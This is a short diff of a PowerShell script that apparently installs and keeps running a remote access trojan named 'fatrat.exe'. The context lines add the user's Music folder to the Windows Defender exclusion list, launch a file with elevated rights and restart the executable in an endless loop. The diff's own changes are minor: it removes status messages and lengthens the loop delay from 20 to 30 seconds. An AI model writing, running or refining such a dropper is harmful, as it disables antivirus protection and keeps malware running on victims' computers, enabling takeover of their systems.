@@ -4,14 +4,7 @@ $path = Join-Path $env:USERPROFILE "Music\fatrat.exe"
 
 if (Test-Path $path) {
     Remove-Item $path -Force
-    Write-Output "rat.exe deleted."
-} else {
-    Write-Output "File not found."
-}
-
-
-
-
+} 
 
 
 Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
@@ -30,7 +23,7 @@ Start-Process -FilePath $dest -Verb RunAs
 
 while ($true) {
     Start-Process "$env:USERPROFILE\Music\fatrat.exe"
-    Start-Sleep -Seconds 20
+    Start-Sleep -Seconds 30
 }
 
 
